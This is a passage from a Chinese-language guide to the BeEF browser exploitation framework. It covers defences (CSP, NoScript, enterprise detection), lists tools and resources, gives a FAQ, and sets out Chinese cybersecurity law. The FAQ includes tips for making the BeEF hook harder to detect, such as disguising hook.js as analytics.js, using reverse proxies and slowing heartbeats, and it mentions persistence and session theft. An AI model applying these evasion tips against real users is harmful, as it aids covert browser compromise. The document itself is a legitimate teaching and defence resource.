5. **ScriptSafe**
   - 功能：更精细的脚本控制
   - 效果： granular级别的脚本权限控制
   - 适用：Chrome

#### 8.2.3 安全浏览习惯

1. **不点击可疑链接**：尤其是来自陌生邮件、即时消息的链接
2. **不随意下载文件**：只从可信来源下载文件
3. **注意浏览器地址栏**：检查网站域名是否正确
4. **及时更新浏览器**：保持浏览器为最新版本
5. **不轻信弹窗**：对各种"中奖"、"更新"弹窗保持警惕
6. **使用独立浏览器**：敏感操作（网银、办公）使用专用浏览器
7. **定期清理浏览器数据**：清除Cookie、缓存等数据

### 8.3 CSP（内容安全策略）防护

#### 8.3.1 CSP简介

内容安全策略（Content Security Policy，CSP）是一种浏览器安全机制，通过白名单的方式控制网页可以加载哪些资源，是防御XSS和BeEF Hook的有效手段。

#### 8.3.2 CSP配置方法

**通过HTTP响应头配置：**

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'
```

**通过meta标签配置（不推荐，功能受限）：**

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

#### 8.3.3 针对BeEF的CSP配置

**严格的CSP策略可以有效阻止BeEF Hook：**

```http
# 只允许加载同源脚本，阻止所有第三方脚本
Content-Security-Policy: script-src 'self'

# 更严格的策略：使用nonce或hash
Content-Security-Policy: script-src 'nonce-随机值'
```

**关键指令说明：**

| 指令 | 作用 | 对BeEF的防护 |
|------|------|-------------|
| `script-src 'self'` | 只允许加载同源脚本 | 阻止从BeEF服务器加载hook.js |
| `script-src 'nonce-xxx'` | 只允许带有特定nonce的脚本 | 最严格的XSS防护 |
| `script-src 'sha256-xxx'` | 只允许特定哈希的脚本 | 防止脚本被篡改 |
| `connect-src 'self'` | 限制AJAX/WebSocket连接目标 | 阻止BeEF的心跳通信 |
| `object-src 'none'` | 禁止Flash等插件 | 防止插件利用 |

#### 8.3.4 CSP部署建议

1. **从报告模式开始**：先使用 `Content-Security-Policy-Report-Only` 收集违规报告，不实际阻止
2. **逐步收紧策略**：从宽松策略逐步过渡到严格策略
3. **使用nonce-based策略**：对于动态内容，使用nonce比白名单更安全
4. **避免使用unsafe-inline和unsafe-eval**：这些会大大削弱CSP的防护效果
5. **定期审计违规报告**：监控CSP违规，及时调整策略

### 8.4 NoScript等防御插件

#### 8.4.1 NoScript详解

NoScript是最著名的JavaScript拦截扩展，采用白名单机制，只允许可信网站运行脚本。

**NoScript的核心功能：**

1. **脚本白名单**：只允许用户明确信任的网站运行JavaScript
2. **XSS防护**：内置XSS过滤器，检测和阻止XSS攻击
3. **Clickjacking防护**：阻止点击劫持攻击
4. **ClearClick**：可视化的点击劫持防护技术
5. **ABE（应用边界强制）**：控制网站之间的交互

**使用建议：**
- 初始阶段设置为"全局禁用脚本"
- 逐步为常用可信网站添加白名单
- 对银行、邮件等敏感网站保持脚本禁用（或严格限制）
- 定期审查白名单，移除不再信任的网站

#### 8.4.2 其他防御工具

**uMatrix：**
- 更细粒度的资源控制
- 可以按域名、类型分别控制
- 学习曲线较陡，但防护能力强

**ScriptBlock：**
- 轻量级脚本拦截工具
- 界面简洁，易于使用
- 适合普通用户

**JavaScript Toggle On and Off：**
- 一键开关JavaScript
- 适合需要频繁切换的场景

### 8.5 企业层面的防护措施

#### 8.5.1 技术防护措施

**1. Web应用防火墙（WAF）**
- 部署WAF检测和阻止XSS攻击
- 配置BeEF特征规则
- 定期更新规则库

**2. 邮件安全网关**
- 过滤钓鱼邮件
- 检测恶意链接
- 扫描附件中的恶意代码

**3. 终端安全**
- 部署EDR/XDR终端检测与响应
- 配置浏览器安全策略
- 监控异常网络连接

**4. DNS安全**
- 部署企业级DNS安全解决方案
- 阻止访问已知的BeEF服务器和恶意域名
- 监控异常DNS查询

**5. 网络分段与隔离**
- 合理划分网络区域
- 限制内网横向访问
- 部署网络流量监控

#### 8.5.2 安全意识培训

**为什么安全意识培训很重要？**

BeEF攻击的起点往往是社会工程学——用户点击了恶意链接、访问了钓鱼页面。技术防护可以阻止一部分攻击，但人的因素始终是最薄弱的环节。

**培训内容建议：**

1. **钓鱼邮件识别**
   - 如何识别可疑邮件
   - 悬停查看链接真实地址
   - 不轻易下载附件
   - 验证发件人身份

2. **浏览器安全**
   - 认识浏览器安全提示
   - 不随意授权权限（摄像头、位置等）
   - 警惕弹窗和通知栏
   - 检查网站证书和域名

3. **密码安全**
   - 使用强密码和密码管理器
   - 不在不同网站复用密码
   - 启用双因素认证
   - 识别钓鱼登录页面

4. **社会工程学防范**
   - 认识常见社工手法
   - 验证请求的真实性
   - 不随意透露敏感信息
   - 可疑情况及时上报

#### 8.5.3 检测与响应

**建立BeEF攻击检测机制：**

1. **网络流量监控**
   - 监控出站连接中的BeEF特征
   - 检测周期性心跳请求
   - 告警异常WebSocket连接

2. **终端行为监控**
   - 监控浏览器异常行为
   - 检测可疑脚本注入
   - 监控Clipboard API异常使用

3. **事件响应流程**
   - 发现疑似BeEF Hook的处理步骤
   - 隔离受感染主机
   - 调查攻击来源和影响范围
   - 清除Hook和加固系统
   - 事后分析和改进防护

#### 8.5.4 安全开发规范

从源头减少XSS等BeEF注入入口：

1. **输入验证**：对所有用户输入进行严格验证和过滤
2. **输出编码**：在将数据输出到HTML/JavaScript时进行适当编码
3. **使用安全框架**：选择内置XSS防护的开发框架
4. **安全编码培训**：对开发人员进行安全编码培训
5. **代码审计**：定期进行代码安全审计
6. **安全测试**：上线前进行渗透测试和漏洞扫描

---

## 第9章 工具与资源

### 9.1 BeEF相关工具与插件

#### 9.1.1 官方工具

| 工具名称 | 说明 | 地址 |
|---------|------|------|
| BeEF 主程序 | BeEF框架核心 | https://beefproject.com/ |
| BeEF GitHub | 官方源码仓库 | https://github.com/beefproject/beef |
| BeEF 文档 | 官方文档 | https://github.com/beefproject/beef/wiki |
| BeEF API文档 | REST API文档 | 管理界面中的API标签页 |

#### 9.1.2 第三方集成工具

**1. Metasploit Framework**
- 功能：漏洞利用框架，与BeEF深度集成
- 用途：获取系统级Shell、后渗透操作
- 地址：https://www.metasploit.com/

**2. Bettercap**
- 功能：网络中间人攻击工具
- 用途：ARP欺骗、HTTP代理注入BeEF Hook
- 地址：https://www.bettercap.org/

**3. MITMf（Man-in-the-Middle Framework）**
- 功能：中间人攻击框架
- 用途：集成BeEF注入功能
- 地址：https://github.com/byt3bl33d3r/MITMf

**4. Evilginx2**
- 功能：中间人钓鱼框架
- 用途：高级钓鱼攻击，可结合BeEF
- 地址：https://github.com/kgretzky/evilginx2

**5. SET（Social-Engineer Toolkit）**
- 功能：社会工程学工具包
- 用途：快速生成钓鱼页面、集成BeEF
- 地址：https://github.com/trustedsec/social-engineer-toolkit

**6. XSStrike**
- 功能：XSS扫描和利用工具
- 用途：自动化发现XSS漏洞，配合BeEF使用
- 地址：https://github.com/s0md3v/XSStrike

#### 9.1.3 浏览器相关工具

**1. Chrome DevTools**
- 功能：Chrome内置开发者工具
- 用途：调试、检测BeEF Hook
- 调用方式：F12或Ctrl+Shift+I

**2. Firefox Developer Tools**
- 功能：Firefox内置开发者工具
- 用途：调试、检测BeEF Hook
- 调用方式：F12或Ctrl+Shift+I

**3. Burp Suite**
- 功能：Web应用安全测试工具
- 用途：拦截HTTP请求、检测Hook、XSS测试
- 地址：https://portswigger.net/burp

**4. OWASP ZAP**
- 功能：开源Web应用安全扫描器
- 用途：自动化漏洞扫描、XSS检测
- 地址：https://www.zaproxy.org/

### 9.2 学习资源与社区

#### 9.2.1 官方资源

- **官方网站**：https://beefproject.com/
- **GitHub仓库**：https://github.com/beefproject/beef
- **Wiki文档**：https://github.com/beefproject/beef/wiki
- **Issue跟踪**：https://github.com/beefproject/beef/issues
- **Twitter**：@beefproject

#### 9.2.2 社区论坛

- **BeEF用户邮件列表**：Google Groups上的beef-users群组
- **Reddit**：r/netsec、r/hacking 等安全社区
- **Stack Overflow**：搜索BeEF相关问题
- **FreeBuf**：国内安全社区，有BeEF相关文章
- **先知社区**：阿里安全社区，有BeEF实战文章
- **看雪论坛**：国内老牌安全论坛

#### 9.2.3 推荐书籍

| 书名 | 作者 | 说明 |
|------|------|------|
| 《The Browser Hacker's Handbook》 | Wade Alcorn等 | BeEF创始人编写，浏览器攻击权威指南 |
| 《XSS跨站脚本攻击剖析与防御》 | 邱永华 | XSS攻击与防御详解 |
| 《Web前端黑客技术揭秘》 | 钟晨鸣等 | 前端安全实战 |
| 《社会工程：安全体系中的人性漏洞》 | Christopher Hadnagy | 社会工程学经典 |
| 《Metasploit渗透测试指南》 | David Kennedy等 | Metasploit入门到精通 |

#### 9.2.4 在线课程

- **Coursera**：Web安全相关课程
- **edX**：网络安全课程
- **SecurityTube**：BeEF相关视频教程
- **B站/YouTube**：搜索"BeEF"可找到大量实操视频
- **i春秋**：国内安全培训平台
- **攻防世界**：CTF训练平台，有Web相关题目

### 9.3 常见问题FAQ

#### 安装相关

**Q1：BeEF启动失败，提示端口被占用怎么办？**
A：修改config.yaml中的http_port和https_port配置，更换为未被占用的端口。或使用 `netstat -ano | findstr 3000`（Windows）/ `lsof -i:3000`（Linux）找到占用进程并结束。

**Q2：BeEF可以在Windows上运行吗？**
A：官方推荐Linux环境，但可以通过WSL2（Windows Subsystem for Linux）或Docker在Windows上运行。原生Windows支持有限。

**Q3：为什么我的BeEF只有很少的模块？**
A：可能是bundle install没有完全成功，部分模块依赖缺失。检查安装日志，重新运行 `bundle install`。

#### 使用相关

**Q4：Hook了浏览器但很快就掉线了怎么办？**
A：可能的原因包括：用户关闭了页面、网络不稳定、浏览器禁用了JavaScript、页面刷新导致Hook丢失。可以使用Persistence模块增强持久性。

**Q5：为什么有些模块执行后显示"不适用"（状态4）？**
A：这表示该模块不支持当前浏览器环境。不同浏览器对API的支持不同，某些模块只能在特定浏览器或版本中运行。

**Q6：BeEF可以Hook移动端浏览器吗？**
A：可以。BeEF支持Android和iOS上的主流浏览器，并且有专门的移动设备模块。但移动浏览器的安全限制通常更多，部分功能可能受限。

**Q7：如何让BeEF的Hook更隐蔽？**
A：可以：1）使用HTTPS加密通信；2）修改Hook.js文件名为常见名称（如analytics.js）；3）将BeEF部署在可信域名下；4）使用反向代理隐藏真实服务；5）修改心跳间隔降低请求频率。

#### 安全与法律

**Q8：用BeEF测试自己的浏览器违法吗？**
A：不违法。在自己拥有所有权的设备上进行测试是完全合法的，这也是学习BeEF的推荐方式。

**Q9：可以用BeEF测试公司的系统吗？**
A：必须获得公司的书面授权。即使是公司员工，未经授权的测试也可能违反公司规定和相关法律。建议走正规的渗透测试流程。

**Q10：BeEF会不会被杀毒软件检测？**
A：BeEF的服务端是正常的Web应用，通常不会被杀毒软件检测。但Hook.js在某些情况下可能被WAF或安全浏览器扩展识别和拦截。

#### 技术问题

**Q11：BeEF与XSS有什么关系？**
A：XSS（跨站脚本攻击）是注入BeEF Hook的常见方式之一。通过XSS漏洞将Hook.js注入到目标网站，访问该网站的用户就会被Hook。但BeEF的注入方式不限于XSS，还有钓鱼、中间人攻击等多种方式。

**Q12：同源策略不会阻止BeEF吗？**
A：不会。BeEF的Hook.js是直接在目标页面中执行的，它与页面属于同一个源，因此不受同源策略限制。BeEF与服务器之间的通信通过CORS、JSONP等方式实现跨域。

**Q13：BeEF可以读取用户浏览器中保存的密码吗？**
A：不能直接读取浏览器的密码管理器数据。但可以通过社会工程模块（如伪造登录页面）诱导用户输入密码，或者窃取当前页面的Cookie和Session。

**Q14：关闭浏览器后BeEF还能控制吗？**
A：不能。BeEF的Hook运行在浏览器进程中，关闭浏览器后Hook自然消失。但如果使用了持久化技术（如浏览器扩展），下次打开浏览器时可能自动重新连接。

### 9.4 法律合规提醒

#### 9.4.1 相关法律法规

**中华人民共和国网络安全法**
- 第二十七条：任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动
- 法律责任：第六十三条规定了相应的处罚措施

**中华人民共和国刑法**
- 第二百八十五条：非法侵入计算机信息系统罪、非法获取计算机信息系统数据罪
- 第二百八十六条：破坏计算机信息系统罪
- 第二百八十七条之一：非法利用信息网络罪
- 第二百八十七条之二：帮助信息网络犯罪活动罪

**中华人民共和国个人信息保护法**
- 禁止非法收集、存储、使用个人信息
- BeEF信息收集功能可能涉及个人信息保护问题

#### 9.4.2 合法使用原则

1. **授权原则**：始终获得目标方的书面授权
2. **范围原则**：严格在授权范围内开展测试
3. **最小影响原则**：尽可能减少对目标系统的影响
4. **保密原则**：对测试中获取的信息严格保密
5. **报告原则**：测试完成后提供完整的测试报告
6. **清理原则**：测试结束后清除所有植入的后门和Hook

#### 9.4.3 学习建议

**1. 搭建本地实验环境**
- 使用虚拟机搭建完整的实验环境
- 安装Kali Linux作为攻击机
- 安装Windows/Linux作为靶机
- 在隔离的网络中进行实验

**2. 使用合法的训练平台**
- **DVWA**：Damn Vulnerable Web Application，用于学习Web漏洞
- **BWAPP**：buggy web application，包含多种漏洞
- **Hack The Box**：在线渗透训练平台
- **TryHackMe**：交互式安全学习平台
- **WebGoat**：OWASP出品的Web安全教学应用

**3. 参与CTF比赛**
- CTF（Capture The Flag）是合法的网络安全竞赛
- 很多Web类型的题目涉及XSS和浏览器安全
- 通过比赛提升实战能力

**4. 加入合法的安全社区**
- 参与开源安全项目贡献
- 参加安全会议和沙龙
- 与同行交流学习心得

#### 9.4.4 道德准则

作为安全从业者，应当遵守以下道德准则：

1. **不作恶**：技术能力应用于防护而非攻击
2. **保护隐私**：尊重和保护用户隐私
3. **如实报告**：真实、完整地报告安全问题
4. **帮助修复**：不仅发现问题，还要协助修复
5. **持续学习**：不断提升自己的技术水平
6. **知识共享**：积极分享安全知识，提升整体安全水平

---

## 附录

### A. BeEF常用快捷键

| 快捷键 | 功能 |
|--------|------|
| Ctrl+A | 全选所有Hooked浏览器 |
| Delete | 删除选中的浏览器 |
| F5 | 刷新管理界面 |
| Esc | 关闭当前弹窗 |

### B. BeEF默认端口清单

| 端口 | 协议 | 用途 |
|------|------|------|
| 3000 | TCP | HTTP管理界面和Hook服务 |
| 6789 | TCP | HTTPS管理界面和Hook服务 |
| 61985 | TCP | WebSocket通信（HTTP） |
| 61986 | TCP | WebSocket通信（HTTPS） |
| 55552 | TCP | Metasploit RPC服务（可选） |

### C. 浏览器缩写对照表

BeEF模块配置中常用的浏览器缩写：

| 缩写 | 浏览器 |
|------|--------|
| FF | Firefox |
| C | Chrome |
| S | Safari |
| IE | Internet Explorer |
| E | Edge |
| O | Opera |
| ALL | 所有浏览器 |

---

**文档版本**：v1.0
**最后更新**：2026年9月
**适用版本**：BeEF 0.5.x

> **再次提醒**：本文档仅供学习研究使用，请遵守相关法律法规，在获得授权的环境中进行测试。



